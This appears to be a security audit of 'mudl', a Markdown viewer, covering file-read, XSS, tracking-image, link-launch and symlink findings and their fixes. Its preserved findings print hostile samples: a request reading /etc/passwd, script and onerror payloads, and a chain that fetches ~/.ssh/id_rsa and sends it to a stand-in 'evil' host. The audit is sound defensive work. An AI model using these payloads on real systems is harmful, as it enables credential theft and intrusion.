# Security Review

A review of `mudl` originally written against `ebab3e7` (Phases 0–15
complete), covering every crate in `crates/`, the bundled assets in
`resources/`, and the vendored third-party JavaScript. **Re-evaluated
against `e88708e`** (2026-09-03), with each finding checked against the
code as it now stands; the crate count is down to seven since the original
review, `mudl-diff` having gone with the feature that used it (Finding 6).

Findings are ordered by original severity. Each one states what the code
does, why it matters, and what a fix looks like; where a fix has landed,
the finding says so and the original description is preserved below it as
the record of what was found.

Current status:

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 2 | Arbitrary local file read over the HTTP server | critical | **Fixed**; two hardening steps still open |
| 3 | Script execution from document content | critical | **Fixed** |
| 4 | Remote images load unconditionally | low | **Fixed** |
| 5 | Link clicks hand arbitrary local files to `xdg-open` | medium | **Fixed** |
| 6 | "Changes since…" runs `git` in an untrusted repo | medium | **Fixed** (by removal) |
| 7 | Atomic writes drop permissions and follow symlinks | low-medium | **Fixed** |
| 8 | Smaller items | — | Three open, one partly fixed, one reduced |


## 1. Threat model

`mudl` opens Markdown files, and Markdown files are routinely untrusted:
a `README.md` from a freshly-cloned repository, a design doc downloaded
from the web, an attachment someone mailed over. **The document is the
attacker-controlled input**, and everything downstream of parsing it sits
inside the blast radius.

The relevant trust boundaries are:

- **The WebView's origin.** Each open document gets its own `mudl-server`
  instance on `127.0.0.1:<OS-assigned port>` and a `webkit2gtk::WebView`
  pointed at it (`crates/mudl-gui/src/window.rs`, `start_server_for`).
  Anything running as script on that origin can reach every route that
  server exposes.
- **The loopback socket itself.** The port is unpredictable but the
  server is unauthenticated, so any other process on the machine that
  finds the port is an equal peer to the WebView.
- **The user's filesystem.** `mudl` runs unsandboxed with the invoking
  user's full privileges.

That last point is the root of most of what follows. `docs/IMPLEMENTATION-PLAN.md`
§1 lists the macOS App Sandbox machinery (`AssetAccessStore`,
`LocalAssetProbe`, `BlockedAssetLog`, security-scoped bookmarks) as
permanently out of scope, on the grounds that "Linux has no default
sandbox denying file reads." That's true as a statement about Linux, but
the conclusion doesn't follow: upstream `mud` relies on the sandbox to
*contain* the behavior that Findings 2 and 3 below describe. Dropping the
sandbox without replacing it with in-app confinement moved that behavior
from contained to unconfined.

*Re-evaluation:* that in-app confinement now exists for the two critical
cases — the `/local/` route serves only paths the open document itself
embedded (Finding 2), and raw HTML and link schemes are sanitized before
they reach the page (Finding 3) — so the gap the missing sandbox left is
closed for those. The unauthenticated loopback socket and the unsandboxed
filesystem access remain properties of the design.


## 2. Arbitrary local file read over the HTTP server

**Severity: critical. Fixed.** Verified against a live server instance
prior to the fix.

`DocumentSource` now records the exact set of local paths each render of
the document resolved (`rewrite_local_image_srcs_with_paths` in
`crates/mudl-core/src/template.rs`), and `serve_local_file`
(`crates/mudl-server/src/server.rs`) refuses any `/local/<path>` request
whose path isn't in that set, before it ever reaches the `FileSystem`. A
request for `/local/%2Fetc%2Fpasswd` — or any other path the open document
didn't itself embed as an image — now gets the same 404 as a path that
doesn't exist, whether or not the file is actually present and readable.

**Still open:** the two hardening steps from the original write-up. As of
`e88708e`, `handle_connection` (`crates/mudl-server/src/server.rs`) still
reads only the request line, so no `Host` header is checked, and the
`/local/` path carries no per-instance token
(`crates/mudl-server/src/routes.rs`). Both would still be worth doing to
close the port-scanning and DNS-rebinding vectors against this and the
other routes — though with the allowlist in place, what either vector now
reaches is the document's own images rather than arbitrary files.

The description below is preserved as the original record of what was
found.

`crates/mudl-server/src/routes.rs` maps `/local/<percent-encoded-path>` to
`Route::LocalFile`, and `serve_local_file` in
`crates/mudl-server/src/server.rs` passes the decoded string straight to
the injected `FileSystem` — which in production is `std::fs::read`
(`crates/mudl-server/src/fs.rs`, `RealFileSystem`). There is no
confinement of any kind: not to the document's directory, not to the
extensions `mudl_core::images::classify` recognizes, not to the set of
paths the document actually references.

There is also no authentication, and `handle_connection` reads only the
request line — headers are never parsed, so `Host` and `Origin` are never
checked.

A request sent to a real server instance:

```
GET /local/%2Fetc%2Fpasswd HTTP/1.1
Host: evil.example
Origin: https://evil.example

→ HTTP/1.1 200 OK
  Content-Type: application/octet-stream
  Content-Length: 1830

  root:x:0:0:root:/root:/bin/bash
  …
```

Note that the arbitrary `Host` was accepted. Two consequences:

- **Any local process or user** can scan loopback for the port and then
  read any file the `mudl` user can — `~/.ssh/id_rsa`,
  `~/.aws/credentials`, browser cookie databases, anything.
- **A remote web page** can do the same via DNS rebinding: point a
  hostname at `127.0.0.1`, and with no `Host` validation the browser
  treats the responses as same-origin with the attacker's page.

It is also the second half of the exploit chain in Finding 3.

**Fix.** The server already knows exactly which local paths a document
legitimately needs: `rewrite_local_image_srcs`
(`crates/mudl-core/src/template.rs`, called from
`crates/mudl-server/src/document.rs`) computes them while rendering.
Record that set on `DocumentSource` at render time and have
`serve_local_file` accept only paths in it, rather than accepting
free-form paths. Two further hardening steps, cheap and independent:

- Mint a random per-instance token when the server binds and require it
  in the path (`/local/<token>/<encoded>`), so a port scan alone isn't
  enough.
- Reject any request whose `Host` header isn't the bound
  `127.0.0.1:<port>`, which closes the DNS-rebinding path. This requires
  reading headers, which `handle_connection` currently skips.


## 3. Script execution from document content

**Severity: critical. Fixed** (the `script-src 'unsafe-inline'` and raw-HTML/
link-scheme pieces below; `img-src` is addressed separately — see
Finding 4). Verified against a live server instance and the CLI prior to
the fix.

`crate::html_sanitize::sanitize_html` (`crates/mudl-core/src/html_sanitize.rs`)
now runs over both raw-HTML pass-through sites in
`crates/mudl-core/src/render.rs` — `render_leaf`'s `Event::InlineHtml` arm
and `render_html_block`'s buffered `Event::Html` — dropping `<script>`,
`<iframe>`, `<object>`, and `<embed>` elements entirely (open tag, content,
and matching close tag), stripping every `on*` attribute from what's left,
and dropping any `href`/`src` attribute whose value isn't `http:`, `https:`,
`mailto:`, or scheme-less (`crate::html_sanitize::is_safe_url`). The same
`is_safe_url` check now gates `render_link`'s `href` (Markdown link syntax,
not just raw HTML), replacing a disallowed scheme with `#` — this is what
closes the `javascript:` link case, since that reaches the page through
`Tag::Link`, not raw HTML.

`crates/mudl-server/src/document.rs`'s `csp_script_src` is now `'self'`
only. The live-reload bootstrap that needed `'unsafe-inline'` for its
one-line `var MUDL_VERSION = N;` script now reads a `data-mudl-version`
attribute on the mode wrapper `<div>` instead (`resources/js/live-reload.js`),
so no inline script remains anywhere in the served page.

Because the sanitizing happens in `render.rs` rather than in the server,
it covers `mudl-cli` output too — the reproduction below, re-run against
`e88708e`, now yields `<img src=x>` (no `onerror`), no `<script>` element,
and `<a href="#">` in place of the `javascript:` link. See the CLI item
under Finding 8 for what that leaves.

The description and reproduction below are preserved as the original
record of what was found.

Raw HTML in a Markdown document passes through the renderer verbatim:
`Event::InlineHtml` is pushed unescaped in `render_leaf`, and
`render_html_block` copies `Event::Html` payloads through the same way
(both in `crates/mudl-core/src/render.rs`). Link destinations are
HTML-escaped but their scheme is never filtered, so `javascript:` URLs
survive intact.

```
$ mudl -u xss.md
<h1 id="hi">Hi</h1>
<script>alert(1)</script>
<img src=x onerror="fetch(1)">
<p><a href="javascript:alert(2)">link</a></p>
```

The CSP the server ships with every page
(`crates/mudl-server/src/document.rs`) permits all of it:

```
default-src 'none'; img-src 'self' https: http: data:;
style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline';
connect-src 'self'
```

`'unsafe-inline'` is present only so the one-line
`var MUDL_VERSION = N;` bootstrap can run.

Put together, **opening a hostile document is enough** to:

1. run arbitrary JavaScript on the server's origin (`script-src
   'unsafe-inline'`);
2. read any file on disk with
   `fetch('/local/%2Fhome%2Fuser%2F.ssh%2Fid_rsa')` — same-origin, so
   `connect-src 'self'` permits it (Finding 2);
3. exfiltrate it with `new Image().src = 'https://evil/?d=' + btoa(data)`
   — `img-src http: https:` permits it.

No interaction beyond opening the file. A `javascript:` link reaches the
same place on a click: `crate::linkaction::classify` returns
`LinkAction::Default` for it (it is neither same-origin nor an
`is_external_source` scheme), so WebKit executes it in page context.

**Fix**, in order of leverage:

- Drop `'unsafe-inline'` from `script-src`. The version can travel as a
  `data-` attribute on `<body>` for `live-reload.js` to read, or behind a
  per-response nonce — either removes the need for it.
- Sanitize raw HTML rather than passing it through. At minimum: drop
  `<script>`, `<iframe>`, `<object>`, and `<embed>`; drop `on*`
  attributes; and allow only `http`, `https`, `mailto`, and `#` in `href`
  and `src`. `pulldown-cmark` hands these through as opaque text events,
  so the filtering has to happen in `render.rs`'s two pass-through sites.
- Tighten `img-src` to `'self' data:` (see Finding 4).

Upstream `mud` passes raw HTML through too, but inside the App Sandbox,
where step 2 has nothing to reach.


## 4. Remote images load unconditionally

**Severity: low. Fixed.**

`DocumentConfig::allow_remote_images` (`crates/mudl-server/src/document.rs`)
now defaults to `false`, and `csp_img_src` only admits `https:`/`http:`
when it's set — otherwise `img-src` is `'self' data:'`. The flag is
deliberately kept out of `Preferences`: it lives as a per-tab
`Rc<Cell<bool>>` on `mudl-gui`'s `toolbar::Context`
(`crates/mudl-gui/src/toolbar.rs`), flipped by the View menu's new "Show
External Images" item (`crates/mudl-gui/src/menu.rs`) and applied by
re-navigating the WebView, same as a theme change. Every document opens
with it off; there's no config path that carries a document's opt-in over
to the next one, whether that's the same file reopened or a different
file entirely.

A blocked remote image no longer falls back to the browser's bare
alt-text rendering, which gave no hint that anything had been hidden:
`resources/js/mud.js` swaps it for a `.mud-blocked-image` placeholder
naming the "Show External Images" menu item, decided from the page's own
CSP `<meta>` tag rather than the browser's `error` event alone (a
same-URL image the reader had previously allowed could otherwise be
served from WebKit's cache with no fresh request and no `error` event on
a later reload with the setting off again).

The description below is preserved as the original record of what was
found.

`img-src` includes `http:` and `https:`
(`crates/mudl-server/src/document.rs`), so a document can reference a
remote image and have it fetched the moment the file is opened. That's a
tracking beacon: it discloses the reader's IP address and the time they
opened the document, to whoever wrote it.

`README.md` currently states that syntax highlighting, Mermaid diagrams,
and math are "all rendered client-side, no network requests." The bundled
renderers do honor that; the image policy doesn't.

**Fix.** Narrow `img-src` to `'self' data:`. Local images already resolve
through the `/local/` route and data URIs are already used by
`--standalone`, so nothing in the feature set needs the remote schemes.
If remote images are wanted later, they belong behind an explicit
per-document opt-in.


## 5. Link clicks hand arbitrary local files to `xdg-open`

**Severity: medium. Fixed.**

`connect_link_navigation` (`crates/mudl-gui/src/window.rs`) now shows a
modal confirmation dialog — naming the exact path — before running
`xdg-open`, via `confirm_open_with_system_default`. `xdg-open` only runs
if the reader clicks "Open"; "Cancel" (or closing the dialog) leaves the
file untouched. This does not change what `xdg-open` is allowed to
launch, only that the reader must knowingly consent to launching it,
which is the informed-consent gap the original finding described.

The description below is preserved as the original record of what was
found.

`rewrite_local_link_hrefs` routes every non-`.md` local link through
`/local-file/`, `crate::linkaction::classify` turns that into
`LinkAction::OpenWithSystemDefault`, and
`connect_link_navigation` in `crates/mudl-gui/src/window.rs` runs
`xdg-open <path>` on it with no confirmation and no check on what the
file is.

A hostile document ships `payload.desktop` (or a shell script with the
executable bit set) beside itself and labels the link "Appendix A". One
click launches it.

Interception is correctly scoped to `NavigationType::LinkClicked`, so
script-driven navigation can't reach this silently — the user has to
click. But a *viewer* is not an application a reader expects to launch
anything, so the click doesn't carry informed consent.

**Fix.** Either confirm the first `xdg-open` per document ("Open
`payload.desktop` with its default application?"), or restrict the
handoff to a known-inert extension set and leave everything else to an
explicit context-menu action.


## 6. "Changes since…" runs `git` inside an untrusted repository

**Severity: medium. Fixed** — by removal. The "Changes since…" feature
(the toolbar button, its git-history popover, the change-tracking diff
overlay, and the `mudl-diff` crate it depended on) has been removed
entirely, so there's no longer any code path that shells out to `git`
inside the document's directory.


## 7. Atomic writes drop permissions and follow symlinks

**Severity: low-medium. Fixed.**

Both `write_atomic` implementations — `crates/mudl-comments/src/write.rs`
and `crates/mudl-config/src/io.rs` — now resolve the target through
symlinks first (`resolve_symlink`, via `std::fs::canonicalize`), create the
temp file with `O_EXCL` (`OpenOptions::create_new`) under a name carrying a
random suffix (`sibling_tmp_path`: PID, nanosecond timestamp, and an
in-process counter) rather than a fixed `<name>.tmp`, and restore the
original file's permissions on the replacement before the `rename`. This
closes all three original issues:

- **Permissions** are now read via `std::fs::metadata` before the write and
  re-applied via `std::fs::set_permissions` on the temp file, so a note
  chmodded to 0600 stays 0600 after a comment is added.
- **Symlinks** are followed to their real target before the temp path is
  chosen and the rename lands on the target, not the link, so a symlinked
  document keeps its link.
- **The temp name** is no longer predictable, and `O_EXCL` independently
  refuses to follow a symlink an attacker pre-placed at the guessed name
  (Linux `open` with `O_CREAT|O_EXCL` fails with `EEXIST` on an existing
  path — including a symlink — rather than dereferencing it), closing the
  shared-writable-directory arbitrary-file-write vector.

Ownership (as opposed to mode) is not restored — restoring it generally
requires `CAP_CHOWN`, which the invoking user's own process doesn't have,
and the common case is a file already owned by that same user.

New tests (`real_file_system_write_atomic_preserves_permissions`,
`real_file_system_write_atomic_follows_symlink` in `mudl-comments`, and
the `real_fs_write_atomic_*` equivalents in `mudl-config`) cover both
behaviors against the real filesystem.

The description below is preserved as the original record of what was
found.

Both `write_atomic` implementations — `crates/mudl-comments/src/write.rs`
and `crates/mudl-config/src/io.rs` — write a sibling temp file with
`std::fs::write` and then `rename` it over the target. Three consequences:

- **Permissions are lost.** The new file is created with the default mode
  (0644 after a typical umask), so a note the user had chmodded to 0600
  becomes world-readable the first time they add a comment to it.
- **Symlinks are replaced, not followed.** If the document is a symlink —
  common in dotfile and notes-vault setups — the rename replaces the
  symlink itself with a regular file, breaking the link.
- **The temp name is predictable.** `notes.md` always writes
  `notes.md.tmp` in the same directory. For a document in a
  shared-writable directory (`/tmp`), a local attacker can pre-create
  that name as a symlink to a file of their choosing and get
  `std::fs::write` to follow it — an arbitrary file write as the user.

**Fix.** `stat` the original before writing and restore its mode (and
ownership where possible) on the replacement; create the temp file with
`O_EXCL` and a random suffix rather than a fixed one; resolve the target
through symlinks before deciding where the temp file goes.


## 8. Smaller items

- **Unbounded request line — open.** (`handle_connection`,
  `crates/mudl-server/src/server.rs:135`). `BufReader::read_line` has no
  size cap, so a local client that sends bytes without a newline grows the
  buffer until the process is out of memory. Thread-per-connection is
  likewise uncapped — the accept loop (`server.rs:108`) spawns without
  limit. Both are local-only denial of service, and both are cheap to
  bound. Unchanged as of `e88708e`.
- **`/local/` serves `.html` as `text/html` — open, reduced.**
  (`crates/mudl-server/src/mime.rs`) on a response that carries no CSP —
  only the document route embeds the `<meta>` policy — and with no
  `X-Content-Type-Options: nosniff`. Finding 2's allowlist shrinks this
  from "any HTML file on disk" to "an HTML file the open document embedded
  as an image", but does not close it:
  `rewrite_local_image_srcs_with_paths`
  (`crates/mudl-core/src/template.rs:293`) admits any non-external `src`
  without consulting `mudl_core::images::classify`'s extension set, so a
  document containing `<img src="notes.html">` still puts an `.html` path
  in the allowlist, where `/local/` will serve it as scriptable
  same-origin content. Two independent fixes, either sufficient: filter
  the allowlist to recognized image extensions, or serve every `/local/`
  response as `application/octet-stream` plus `nosniff`.
- **`html_escape` doesn't escape `'` — open.**
  (`crates/mudl-core/src/encoding.rs`; `encoding.rs:72` still asserts `'`
  passes through). Safe today only because every attribute this codebase
  emits is double-quoted; it's a trap for whoever adds the first
  single-quoted one. Add `&#39;`.
- **CLI output is an unsanitized fragment — mostly fixed.** Finding 3's
  sanitizing lives in `render.rs`, which `render_one`
  (`crates/mudl-cli/src/main.rs:189`) goes through, so the stored-XSS half
  of this item is closed: `<script>`, `on*` handlers, and `javascript:`
  hrefs no longer survive `mudl -u`. What remains is not a vulnerability
  but a documented shape — `render_one` still emits no document wrapper,
  so its output carries no CSP and must be embedded in a page that
  supplies one. Still open and still not a security issue:
  `--fragment`/`-f` is parsed in `crates/mudl-cli/src/args.rs` but never
  read by `render_one`, so it remains a no-op.
- **Vendored JavaScript is pinned with no update path — open.**
  `resources/js/` carries highlight.js 11.9.0 (2023), Temml 0.13.3, and
  Mermaid 11.12.3 — the same three versions as at `ebab3e7`. Both
  configurable renderers are configured correctly —
  Mermaid runs at its default `securityLevel: 'strict'` (DOMPurify
  sanitized) and Temml's `trust` defaults to false, so neither `\href`
  nor raw HTML labels are live. The concern is staleness: nothing in the
  build notices when one of these picks up a published advisory.


## 9. What was checked and found clean

For the record, so a later reviewer doesn't re-derive it. Re-confirmed
against `e88708e`:

- **No `unsafe` outside one audited site.** The only `unsafe` block is
  `pre_exec(|| { libc::setsid(); … })` in
  `crates/mudl-cli/src/main.rs`, which is a correct use of a
  post-fork/pre-exec hook.
- **No shell interpolation anywhere.** Every `Command::new` call site
  passes arguments as separate `arg`/`args` values. Three remain
  (`xdg-open` and the two re-execs of `mudl` itself); the `git` call sites
  went with Finding 6's removal.
- **Asset routing is an allowlist**, not a path lookup
  (`crates/mudl-server/src/assets.rs`), so `/assets/` has no traversal
  surface.
- **Host-side JavaScript is escaped.** Every `evaluate_javascript` call
  that embeds document-derived data (outline slugs and comment labels —
  the change group IDs went with Finding 6) routes it through
  `mudl_core::template::js_string_literal` first
  (`crates/mudl-gui/src/sidebar.rs`). Find-in-page uses WebKit's native
  `FindController` and interpolates nothing.
- **Comment labels are constrained** to `[A-Za-z0-9_-]`
  (`crates/mudl-comments/src/labels.rs`) *and* HTML-escaped at every
  emission site.
- **The server binds loopback only** — `TcpListener::bind("127.0.0.1:0")`.
- **No panics on hostile input.** 300 pathological documents (nested and
  unterminated delimiters, mixed encodings, embedded NULs, CRLF, astral
  plane characters) rendered through both `-u` and `-d` without a single
  panic. The suite stood at 815 tests then; it is 710 at `e88708e`, all
  passing — the drop is Finding 6's removal of `mudl-diff` and the
  change-tracking UI, and the fixes for Findings 2, 3, 5, and 7 each added
  tests of their own.
